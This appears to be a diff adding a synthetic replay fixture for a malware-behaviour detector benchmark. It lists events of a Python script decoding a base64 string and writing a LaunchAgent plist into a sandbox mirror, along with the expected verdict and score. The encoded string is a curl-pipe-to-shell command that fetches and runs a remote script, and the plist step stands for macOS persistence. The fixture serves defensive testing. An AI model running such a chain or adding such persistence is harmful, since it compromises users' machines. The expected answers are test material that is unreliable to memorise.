@@ -1,0 +1,79 @@
+{
+  "sample_id": "replay_suspicious_python_decode_plist_mirror_02",
+  "group": "suspicious",
+  "summary": "Python script decodes command-like string and writes LaunchAgent plist into sandbox mirror.",
+  "expected_verdict": "suspicious",
+  "expected_score_range": [52, 68],
+  "expected_top_findings": [
+    "obfuscation_pattern",
+    "persistence_pattern",
+    "launchagent_mirror_write"
+  ],
+  "events": [
+    {
+      "timestamp": "2026-03-08T10:10:00Z",
+      "category": "processCreated",
+      "processID": 3200,
+      "parentProcessID": 1300,
+      "processName": "python3",
+      "executablePath": "/usr/bin/python3",
+      "action": "spawn",
+      "target": "benchmark/fixtures/suspicious_decode.py",
+      "details": "Script launched from Terminal.",
+      "riskScoreDeltaHint": 2,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:10:01Z",
+      "category": "scriptExecuted",
+      "processID": 3200,
+      "parentProcessID": 1300,
+      "processName": "python3",
+      "executablePath": "/usr/bin/python3",
+      "action": "decodeBase64String",
+      "target": "Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUuY29tL2Euc2ggfCBzaA==",
+      "details": "Decoded text resembled curl|sh chain.",
+      "riskScoreDeltaHint": 13,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:10:02Z",
+      "category": "fileCreated",
+      "processID": 3200,
+      "parentProcessID": 1300,
+      "processName": "python3",
+      "executablePath": "/usr/bin/python3",
+      "action": "create",
+      "target": "benchmark/sandbox_sensitive_mirror/Library/LaunchAgents/com.synthetic.decode.plist",
+      "details": "Wrote LaunchAgent-like plist in mirror path.",
+      "riskScoreDeltaHint": 12,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:10:03Z",
+      "category": "persistenceAttempt",
+      "processID": 3200,
+      "parentProcessID": 1300,
+      "processName": "python3",
+      "executablePath": "/usr/bin/python3",
+      "action": "simulateLaunchAgentInstall",
+      "target": "benchmark/sandbox_sensitive_mirror/Library/LaunchAgents/com.synthetic.decode.plist",
+      "details": "Persistence behavior represented in mirror; no launchctl execution in replay source.",
+      "riskScoreDeltaHint": 16,
+      "rawSource": "synthetic.replay.v1"
+    },
+    {
+      "timestamp": "2026-03-08T10:10:04Z",
+      "category": "processExited",
+      "processID": 3200,
+      "parentProcessID": 1300,
+      "processName": "python3",
+      "executablePath": "/usr/bin/python3",
+      "action": "exit",
+      "target": "self",
+      "details": "Script exited.",
+      "riskScoreDeltaHint": 0,
+      "rawSource": "synthetic.replay.v1"
+    }
+  ]
+}
